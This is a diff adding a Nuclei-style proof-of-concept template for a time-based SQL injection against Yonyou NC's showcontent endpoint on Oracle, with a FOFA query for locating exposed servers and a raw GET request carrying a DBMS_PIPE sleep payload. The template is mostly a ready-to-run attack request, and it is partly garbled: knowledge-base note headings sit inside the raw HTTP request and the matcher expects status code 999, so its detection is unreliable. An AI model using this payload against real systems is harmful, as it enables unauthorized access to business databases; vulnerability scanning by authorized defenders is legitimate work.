@@ -1,0 +1,46 @@
+id: poc-nr82ib62f4u9l0gd
+info:
+  name: 用友 NC showcontent SQL注入漏洞-Oracle
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nr82ib62f4u9l0gd'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nr82ib62f4u9l0gd
+    fofa: body="UClient.dmg"
+http:
+- raw:
+  - 'GET /ebvp/infopub/showcontent?id=1''%20AND%203983=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(76)||CHR(108)||CHR(101),9)%20AND%20''Mgtn''=''Mgtn HTTP/1.1
+
+
+    Accept-Encoding: identity
+
+
+    Connection: close
+
+
+    Content-Type: text/xml; charset=utf-8
+
+
+    SL-CE-SUID: 31
+
+
+    # 响应代码特征
+
+    999
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 999
+    type: status
